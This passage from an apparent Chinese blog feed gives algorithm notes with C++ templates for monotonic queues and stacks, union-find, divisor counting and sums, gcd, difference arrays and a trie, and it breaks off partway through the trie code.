    <content type="html"><![CDATA[<p>单调队列，用来维护给定大小区间的最值。并且队列中元素之间的关系具有单调性，而且，队首和队尾都可以进行出队操作，只有队尾可以进行入队操作。<br>可以用来维护给定区间的最大（最小值）（滑动窗口）</p><p>单调栈，用来维护最近的大于&#x2F;小于关系，可以维护偏向全局的大小关系。</p><h4 id="单调队列实现"><a href="#单调队列实现" class="headerlink" title="单调队列实现"></a>单调队列实现</h4><h5 id="去尾操作"><a href="#去尾操作" class="headerlink" title="去尾操作"></a>去尾操作</h5><p>用来维护队列的单调性，当有新元素需要入队时，从队尾向前依次移除影响单调性的元素。操作结束后，进行入队。</p><h5 id="删头操作"><a href="#删头操作" class="headerlink" title="删头操作"></a>删头操作</h5><p>用来维护求解区间，当头部元素不在要求求解的区间里时，对头部元素进行删除。</p><h5 id="取解操作"><a href="#取解操作" class="headerlink" title="取解操作"></a>取解操作</h5><p>当进行完上面两步的操作后，那么队头元素即为该区间的极值。</p><p>队列中存的是下标。</p><h5 id="实现形式"><a href="#实现形式" class="headerlink" title="实现形式"></a>实现形式</h5><h6 id="STL"><a href="#STL" class="headerlink" title="STL"></a>STL</h6><p>双向队列</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c++">deque&lt;<span class="hljs-type">int</span>&gt;que;<br><span class="hljs-built_in">pop_front</span>()<br><span class="hljs-built_in">pop_back</span>()<br></code></pre></td></tr></table></figure><p>等方法删头去尾</p><h6 id="手写"><a href="#手写" class="headerlink" title="手写"></a>手写</h6><p>定义一个长数组</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-type">int</span> a[maxn];<span class="hljs-comment">//队列</span><br><span class="hljs-type">int</span> head,tail；<span class="hljs-comment">//队列指针</span><br></code></pre></td></tr></table></figure><h4 id="单调栈实现模板"><a href="#单调栈实现模板" class="headerlink" title="单调栈实现模板"></a>单调栈实现模板</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c++">stack&lt;<span class="hljs-type">int</span>&gt; s;<br><span class="hljs-keyword">for</span> (遍历这个数组)<br>&#123;<br><span class="hljs-comment">//当判断是栈顶元素小于当前元素为单调递减栈，相反为单调递增栈</span><br><span class="hljs-keyword">while</span> (栈不为空 &amp;&amp; 栈顶元素小于当前元素)<br>&#123;<br>栈顶元素出栈;<br>更新结果;<br>&#125;<br>当前数据入栈;<br>&#125;<br><br><br></code></pre></td></tr></table></figure><h4 id="单调队列实现模板"><a href="#单调队列实现模板" class="headerlink" title="单调队列实现模板"></a>单调队列实现模板</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c++">deque&lt;<span class="hljs-type">int</span>&gt;dq;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;n;i++)<br>    &#123;<br>        <span class="hljs-keyword">if</span>(!dq.<span class="hljs-built_in">empty</span>()&amp;&amp; dq.<span class="hljs-built_in">front</span>() &lt;i-k+<span class="hljs-number">1</span>)<span class="hljs-comment">//最前方元素是否超出范围</span><br>        &#123;<br>            dq.<span class="hljs-built_in">pop_front</span>();<br>        &#125;<br>        <span class="hljs-keyword">while</span>(!dq.<span class="hljs-built_in">empty</span>() &amp;&amp; a[dq.<span class="hljs-built_in">back</span>()]&gt;=a[i])<span class="hljs-comment">//维护某种单调性</span><br>        &#123;<br>            dq.<span class="hljs-built_in">pop_back</span>();<br>        &#125;<br>        dq.<span class="hljs-built_in">push_back</span>(i);<br>        <span class="hljs-keyword">if</span>(i&gt;=k<span class="hljs-number">-1</span>) <span class="hljs-comment">//下标是否达到所需数量。</span><br>        &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d &quot;</span>,a[dq.<span class="hljs-built_in">front</span>()]);<br>        &#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>算法</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>map和unordered_map</title>
    <link href="/2022/03/26/map%E5%92%8Cunordered_map/"/>
    <url>/2022/03/26/map%E5%92%8Cunordered_map/</url>
    
    <content type="html"><![CDATA[<p>map:map内部实现是红黑树，红黑树是非严格平衡二叉搜索树，而AVL是严格的平衡二叉搜索树，红黑树有自动排序的功能，因此map内部的元素都是有序的，操作时间复杂度为O（logn）。<br>unordered_map:内部是哈希表，在没有冲突的情况下访问速度为O（1）。<br>但在最坏的情况下可达到O（n）效率不稳定，而且不有序。<br>例题：<br><a href="https://codeforces.com/problemset/problem/1676/F">https://codeforces.com/problemset/problem/1676/F</a><br>使用unordered_map会超时，而使用map不会。</p>]]></content>
    
    
    <categories>
      
      <category>C++</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>并查集</title>
    <link href="/2022/03/25/%E5%B9%B6%E6%9F%A5%E9%9B%86/"/>
    <url>/2022/03/25/%E5%B9%B6%E6%9F%A5%E9%9B%86/</url>
    
    <content type="html"><![CDATA[<p>并查集是一种树型的数据结构，用于处理一些不相交集合（disjoint sets）的合并及查询问题。并查集通常包含两种操作，查找，合并。<br>模板代码：<br>朴素并查集+路径压缩优化:</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">find</span><span class="hljs-params">(<span class="hljs-type">int</span> x)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">if</span>(p[x]!=x) p[x]= <span class="hljs-built_in">find</span>(p[x]);<br>    <span class="hljs-keyword">return</span> p[x];<br>&#125;<br><span class="hljs-comment">//p[x]存储每个点的祖宗节点。</span><br><span class="hljs-comment">//find(x)返回x的祖宗节点。</span><br><span class="hljs-comment">// 初始化，假定节点编号是1~n</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt;= n; i ++ ) p[i] = i;<br><span class="hljs-comment">// 合并a和b所在的两个集合：</span><br>    p[<span class="hljs-built_in">find</span>(a)] = <span class="hljs-built_in">find</span>(b);<br></code></pre></td></tr></table></figure><p>并查集同时还可以维护同一类别节点数量。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-type">int</span> size[N];<span class="hljs-comment">//存储节点数量数组。size[i]表示第i个集合的节点数量。</span><br><span class="hljs-comment">// 初始化，假定节点编号是1~n</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt;= n; i ++ )<br>    &#123;<br>        p[i] = i;<br>        size[i] = <span class="hljs-number">1</span>;<br>    &#125;<br><span class="hljs-comment">// 合并a和b所在的两个集合：</span><br>size[<span class="hljs-built_in">find</span>(b)] += size[<span class="hljs-built_in">find</span>(a)];<br>p[<span class="hljs-built_in">find</span>(a)] = <span class="hljs-built_in">find</span>(b);<br></code></pre></td></tr></table></figure><p>也可以同时维护到祖宗节点的距离。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-type">int</span> p[N], d[N];<span class="hljs-comment">//p[]存储每个点的祖宗节点, d[x]存储x到p[x]的距离</span><br><span class="hljs-comment">// 返回x的祖宗节点</span><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">find</span><span class="hljs-params">(<span class="hljs-type">int</span> x)</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">if</span> (p[x] != x)<br>  &#123;<br>     <span class="hljs-type">int</span> u = <span class="hljs-built_in">find</span>(p[x]);<br>     d[x] += d[p[x]];<br>     p[x] = u;<br>   &#125;<br>   <span class="hljs-keyword">return</span> p[x];<br>&#125;<br>   <span class="hljs-comment">// 合并a和b所在的两个集合：</span><br>    p[<span class="hljs-built_in">find</span>(a)] = <span class="hljs-built_in">find</span>(b);<br>    d[<span class="hljs-built_in">find</span>(a)] = distance; <span class="hljs-comment">// 根据具体问题，初始化find(a)的偏移量</span><br><br></code></pre></td></tr></table></figure><p>例题：<a href="https://www.acwing.com/problem/content/242/">https://www.acwing.com/problem/content/242/</a><br>代码：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;bits/stdc++.h&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><span class="hljs-type">const</span> <span class="hljs-type">int</span> N =<span class="hljs-number">50005</span>;<br><span class="hljs-type">int</span> p[N];<br><span class="hljs-type">int</span> d[N];<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">find</span><span class="hljs-params">(<span class="hljs-type">int</span> x)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">if</span>(p[x]!=x) <br>    &#123;<br>        <span class="hljs-type">int</span> t = <span class="hljs-built_in">find</span>(p[x]);<br>        d[x]+=d[p[x]];<br>        p[x]=t;<br>    &#125;<br>    <span class="hljs-keyword">return</span> p[x];<br>&#125;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">int</span> n,k;<br>    cin&gt;&gt;n&gt;&gt;k;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">1</span>;i&lt;=n;i++) p[i] = i;<br>    <span class="hljs-type">int</span> t,x,y;<br>    <span class="hljs-type">int</span> ans=<span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">while</span>(k--)<br>    &#123;<br>        cin&gt;&gt;t&gt;&gt;x&gt;&gt;y;<br>        <span class="hljs-keyword">if</span>(x&gt;n || y&gt;n)++ans;<br>        <span class="hljs-keyword">else</span><span class="hljs-comment">//不冲突即为真话。</span><br>        &#123;<br>            <span class="hljs-type">int</span> px= <span class="hljs-built_in">find</span>(x);<br>            <span class="hljs-type">int</span> py =<span class="hljs-built_in">find</span>(y);<br>            <span class="hljs-keyword">if</span>(t==<span class="hljs-number">1</span>)<br>            &#123;<br>                <span class="hljs-keyword">if</span>(px==py &amp;&amp; (d[x]-d[y])%<span class="hljs-number">3</span>!=<span class="hljs-number">0</span>)<span class="hljs-comment">//已经在一个集合里面， t==1 (d[x]%3 != d[y]%3) 不为0 即，x,y不为同类。</span><br>                &#123;<br>                    ++ans;<span class="hljs-comment">//假话增加。</span><br>                &#125;<br>                <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(px!=py)<span class="hljs-comment">//x,y不属于同一个集合。 将x,y更新到同一个集合当中。</span><br>                &#123;<br>                    p[px] = py;<br>                    d[px] = d[y]-d[x];<span class="hljs-comment">//距离更新，满足(d[x]+d[px]-d[y])%3==0,更新为同类。</span><br>                &#125;<br>            &#125;<br>            <span class="hljs-keyword">else</span><br>            &#123;<br>                <span class="hljs-keyword">if</span>(px==py &amp;&amp; (d[x]-d[y]<span class="hljs-number">-1</span>)%<span class="hljs-number">3</span>!=<span class="hljs-number">0</span>) ans++;<span class="hljs-comment">//x,y在同一个集合当中。若x吃y，则 (d[x]-d[y]-1)%3==0,反之为假话。</span><br>                <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(px!=py) <span class="hljs-comment">//x,y不属于同一集合，将x,y更新到同一个集合当中。</span><br>                &#123;<br>                    p[px] = py;<br>                    d[px] = d[y]+<span class="hljs-number">1</span>-d[x];<span class="hljs-comment">//距离更新，满足(d[x]-d[y]-1+d[px])%3==0 使得x吃y。</span><br>                    <br>                &#125;<br>            &#125;<br>            <br>        &#125;<br>    &#125;<br>    cout&lt;&lt;ans&lt;&lt;endl;<br>    <br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>算法</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>最小生成树的算法</title>
    <link href="/2022/03/20/%E6%9C%80%E5%B0%8F%E7%94%9F%E6%88%90%E6%A0%91mst/"/>
    <url>/2022/03/20/%E6%9C%80%E5%B0%8F%E7%94%9F%E6%88%90%E6%A0%91mst/</url>
    
    <content type="html"><![CDATA[<h3 id="prim算法"><a href="#prim算法" class="headerlink" title="prim算法"></a>prim算法</h3><p>从已知的某个定点向外扩散，寻找最小的邻边，将顶点加入集合，如果顶点已经加入，则跳过（防止成环），直到所有顶点都加入到集合中，构成mst。<br>适合稠密图</p><h3 id="kruskal算法"><a href="#kruskal算法" class="headerlink" title="kruskal算法"></a>kruskal算法</h3><p>从整个图的最小的一条边开始贪心，在不成环的情况下，不断和并最后构成最小生成树。<br>适合稀疏图。</p>]]></content>
    
    
    <categories>
      
      <category>算法</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>约数问题</title>
    <link href="/2022/03/12/%E7%BA%A6%E6%95%B0%E9%97%AE%E9%A2%98/"/>
    <url>/2022/03/12/%E7%BA%A6%E6%95%B0%E9%97%AE%E9%A2%98/</url>
    
    <content type="html"><![CDATA[<h3 id="求约数"><a href="#求约数" class="headerlink" title="求约数"></a>求约数</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function">vector&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title">y</span><span class="hljs-params">(<span class="hljs-type">int</span> x)</span></span><br><span class="hljs-function"></span>&#123;<br>    vector&lt;<span class="hljs-type">int</span>&gt;ans;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">1</span>;i&lt;=x/i;i++)<br>    &#123;<br>        <span class="hljs-keyword">if</span>(x%i==<span class="hljs-number">0</span>)<span class="hljs-comment">//能整除，为一个约数</span><br>        &#123;<br>            ans.<span class="hljs-built_in">push_back</span>(i);<span class="hljs-comment">//加入答案</span><br>            <span class="hljs-keyword">if</span>(i!=x/i) ans.<span class="hljs-built_in">push_back</span>(x/i);<span class="hljs-comment">//防止加入相同的约数。</span><br>        &#125;<br>    &#125;<br>    <span class="hljs-built_in">sort</span>(ans.<span class="hljs-built_in">begin</span>(),ans.<span class="hljs-built_in">end</span>());<br>    <span class="hljs-keyword">return</span> ans;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="求约数个数"><a href="#求约数个数" class="headerlink" title="求约数个数"></a>求约数个数</h3><h4 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念:"></a>基本概念:</h4><p>1.算术基本定理:任何一个大于1的自然数 N,如果N不为质数，那么N可以唯一分解成有限个质数的乘积。<br>2.约数定理：一个数分解成有限个质因数的乘积，设质因数指数为a1,a2,a3….<br>则约数的总个数为（a1+1)<em>(a2+1)</em>(a3+1)……。有乘法定理即可简单理解。<br>代码：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;bits/stdc++.h&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><span class="hljs-type">const</span> <span class="hljs-type">int</span> mod =<span class="hljs-number">1e9</span>+<span class="hljs-number">7</span>;<br><span class="hljs-type">int</span> n;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>,&amp;n);<br>    unordered_map&lt;<span class="hljs-type">int</span>,<span class="hljs-type">int</span>&gt;map;<br>    <span class="hljs-keyword">while</span>(n--)<br>    &#123;<br>        <span class="hljs-type">int</span> x;<br>        cin&gt;&gt;x;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">2</span>;i&lt;=x/i;i++)<br>        &#123;<br>            <span class="hljs-keyword">while</span>(x%i==<span class="hljs-number">0</span>)<br>            &#123;<br>                x/=i;<br>                ++map[i];<span class="hljs-comment">//记录每个质因数的指数</span><br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">if</span>(x&gt;<span class="hljs-number">1</span>) ++map[x];<br>    &#125;<br>    <span class="hljs-type">long</span> <span class="hljs-type">long</span> ans =<span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-keyword">auto</span>&amp;m:map)<br>    &#123;<br>        ans = ans*(m.second+<span class="hljs-number">1</span>)%mod;<span class="hljs-comment">//相乘。</span><br>    &#125;<br>    cout&lt;&lt;ans&lt;&lt;endl;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="求约数之和"><a href="#求约数之和" class="headerlink" title="求约数之和"></a>求约数之和</h3><p>约数和定理：<br>对于一个大于1正整数n可以分解质因数：n&#x3D;p1^a1<em>p2^a2</em>p3^a3<em>…</em>pk^ak,<br>那么n的(a₁+1)(a₂+1)(a₃+1)…(ak+1)个正约数的和为<br>f(n)&#x3D;(p1^0+p1^1+p1^2+…p1^a1)(p2^0+p2^1+p2^2+…p2^a2)…(pk^0+pk^1+pk^2+…pk^ak）。<br>代码：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;bits/stdc++.h&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><span class="hljs-type">const</span> <span class="hljs-type">int</span> mod =<span class="hljs-number">1e9</span>+<span class="hljs-number">7</span>;<br><span class="hljs-type">int</span> n;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>,&amp;n);<br>    unordered_map&lt;<span class="hljs-type">int</span>,<span class="hljs-type">int</span>&gt;map;<br>    <span class="hljs-keyword">while</span>(n--)<br>    &#123;<br>        <span class="hljs-type">int</span> x;<br>        cin&gt;&gt;x;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">2</span>;i&lt;=x/i;i++)<br>        &#123;<br>            <span class="hljs-keyword">while</span>(x%i==<span class="hljs-number">0</span>)<br>            &#123;<br>                x/=i;<br>                ++map[i];<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">if</span>(x&gt;<span class="hljs-number">1</span>) ++map[x];<br>    &#125;<br>    <span class="hljs-type">long</span> <span class="hljs-type">long</span> ans =<span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-keyword">auto</span>&amp;m:map)<br>    &#123;<br>        <span class="hljs-type">int</span> p = m.first;<br>        <span class="hljs-type">int</span> a = m.second;<br>        <span class="hljs-type">long</span> <span class="hljs-type">long</span> t =<span class="hljs-number">1</span>;<br>        <span class="hljs-keyword">while</span>(a--) t= (t*p+<span class="hljs-number">1</span>)%mod;<span class="hljs-comment">//秦九韶算法，计算 p0+.....+pk。</span><br>        ans = (ans*t)%mod;<br>    &#125;<br>    cout&lt;&lt;ans&lt;&lt;endl;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="最大公约数"><a href="#最大公约数" class="headerlink" title="最大公约数"></a>最大公约数</h3><p>扩展欧几里的算法<br>gcd(a,b)&#x3D;gcd(b,a%b)<br>代码：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">gcd</span><span class="hljs-params">(<span class="hljs-type">int</span> a,<span class="hljs-type">int</span> b)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">return</span> b? <span class="hljs-built_in">gcd</span>(b,a%b):a;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>算法</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>引用传值</title>
    <link href="/2022/03/11/C++%E5%BC%95%E7%94%A8%E4%BC%A0%E5%80%BC/"/>
    <url>/2022/03/11/C++%E5%BC%95%E7%94%A8%E4%BC%A0%E5%80%BC/</url>
    
    <content type="html"><![CDATA[<p>同样的cmp函数</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c++"> <span class="hljs-keyword">auto</span> cmp = [&amp;](<span class="hljs-type">const</span> vector&lt;<span class="hljs-type">int</span>&gt;  a, <span class="hljs-type">const</span> vector&lt;<span class="hljs-type">int</span>&gt;  b) &#123;<br>    <span class="hljs-keyword">return</span> a[<span class="hljs-number">0</span>] == b[<span class="hljs-number">0</span>] ? (a[<span class="hljs-number">1</span>] &lt; b[<span class="hljs-number">1</span>]) : (a[<span class="hljs-number">0</span>] &gt; b[<span class="hljs-number">0</span>]);<br>&#125;;<br></code></pre></td></tr></table></figure><p>使用值传递会直接超时</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c++"> <span class="hljs-keyword">auto</span> cmp = [&amp;](<span class="hljs-type">const</span> vector&lt;<span class="hljs-type">int</span>&gt;  &amp;a, <span class="hljs-type">const</span> vector&lt;<span class="hljs-type">int</span>&gt;  &amp;b) &#123;<br>    <span class="hljs-keyword">return</span> a[<span class="hljs-number">0</span>] == b[<span class="hljs-number">0</span>] ? (a[<span class="hljs-number">1</span>] &lt; b[<span class="hljs-number">1</span>]) : (a[<span class="hljs-number">0</span>] &gt; b[<span class="hljs-number">0</span>]);<br>&#125;;<br></code></pre></td></tr></table></figure><p>使用引用传值时则不会</p>]]></content>
    
    
    <categories>
      
      <category>C++</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>查分算法</title>
    <link href="/2022/03/10/%E5%B7%AE%E5%88%86%E7%AE%97%E6%B3%95/"/>
    <url>/2022/03/10/%E5%B7%AE%E5%88%86%E7%AE%97%E6%B3%95/</url>
    
    <content type="html"><![CDATA[<p><img src="/upload/2022/03/image-4fb92c4b8d2249b986fb04cdde61a4b7.png" alt="image.png"></p><h4 id="差分可以看做是求前缀和的逆向过程。"><a href="#差分可以看做是求前缀和的逆向过程。" class="headerlink" title="差分可以看做是求前缀和的逆向过程。"></a>差分可以看做是求前缀和的逆向过程。</h4><p>差分数组的定义为<br>d[i] &#x3D; a[i]-a[i-1];<br>例如现在有一个数组为<br>[1,3,5,4,2]<br>那么它的差分数组为<br>[0,2,2,-1,-2]</p><h4 id="差分数组如何做到时间复杂度为O-1-的数组区间修改的。"><a href="#差分数组如何做到时间复杂度为O-1-的数组区间修改的。" class="headerlink" title="差分数组如何做到时间复杂度为O(1)的数组区间修改的。"></a>差分数组如何做到时间复杂度为O(1)的数组区间修改的。</h4><p>例如，现在想对区间[l,r]的进行加v的操作。<br>那么只需要在差分数组进行操作：<br>d[l]&#x3D;d[l]+v;<br>d[r+1]&#x3D;d[r+1]-v;<br>这样在求回原数组的时候，d[l]增加了v，由于累加的性质，那么它后面直到下标r都增加了v。 对于d[r+1]来说，由差分数组的定义，被减数不变，减数增加了v那么它必定也要减小v，所以进行该两项进行操作。</p><h4 id="模板例题"><a href="#模板例题" class="headerlink" title="模板例题"></a>模板例题</h4><p><a href="https://leetcode-cn.com/problems/corporate-flight-bookings/">https://leetcode-cn.com/problems/corporate-flight-bookings/</a></p>]]></content>
    
    
    <categories>
      
      <category>算法</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>字典数tried</title>
    <link href="/2022/03/10/%E5%AD%97%E5%85%B8%E6%A0%91Trie/"/>
    <url>/2022/03/10/%E5%AD%97%E5%85%B8%E6%A0%91Trie/</url>
    
    <content type="html"><![CDATA[<p>字典树又称单词查找树，Trie树，是一种树形结构，是一种哈希树的变种。典型应用是用于统计，排序和保存大量的字符串（但不仅限于字符串），所以经常被搜索引擎系统用于文本词频统计。它的优点是：利用字符串的公共前缀来减少查询时间，最大限度地减少无谓的字符串比较，查询效率比哈希树高。</p><p>字符串统计：<br>模板：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-type">int</span> son[N][<span class="hljs-number">26</span>];<span class="hljs-comment">//存储节点，的下一个节点的下标。</span><br><span class="hljs-type">int</span> idx;<br><span 